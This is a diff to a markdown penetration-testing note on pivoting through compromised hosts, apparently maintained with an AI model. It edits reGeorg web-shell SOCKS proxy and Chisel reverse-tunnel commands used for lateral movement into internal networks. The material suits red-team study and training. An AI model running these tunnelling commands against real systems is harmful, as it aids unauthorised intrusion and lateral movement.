@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Use a compromised host (pivot/beachhead) to relay traffic into internal network segments not reachable from the attack machine. Covers dynamic SOCKS proxies, local/remote port forwarding, SSH tunneling, Ligolo-ng, Chisel, and proxychains. Essential for lateral movement after initial access.
+Use a compromised host (pivot/beachhead) to relay traffic into internal network segments not reachable from the attack machine. Covers dynamic SOCKS proxies, local/remote port forwarding, SSH tunneling, Ligolo-ng, Chisel, and proxychains. Essential for lateral movement after initial access. Pairs with [[Password Attacks]], [[Metasploit]], [[Exploit & File Transfers]].
 
 ---
 
@@ -599,7 +599,8 @@ git clone https://github.com/sensepost/reGeorg.git
 # Tomcat: tunnel.war → extract tunnel.jsp into webroot
 
 # Start the SOCKS proxy — points at the uploaded shell
-python3 reGeorgSocksProxy.py -p 1080 -u http://target.com/tunnel.php
+# (original sensepost/reGeorg is Python2; use the py3 fork or `python2 reGeorgSocksProxy.py`)
+python2 reGeorgSocksProxy.py -p 1080 -u http://target.com/tunnel.php
 
 # Use via proxychains
 # /etc/proxychains.conf: socks5 127.0.0.1 1080
@@ -677,7 +678,7 @@ LIGOLO-NG (preferred for scanning)
 [ ] For double pivot: listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
 
 CHISEL
-[ ] Reverse: sudo ./proxy server --reverse -v -p 1234 --socks5 (attacker)
+[ ] Reverse: sudo ./chisel server --reverse -v -p 1234 --socks5 (attacker)
 [ ] ./chisel client <attacker>:1234 R:socks (pivot)
 [ ] Configure proxychains: socks5 127.0.0.1 1080
 
@@ -695,5 +696,5 @@ WINDOWS PIVOT
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
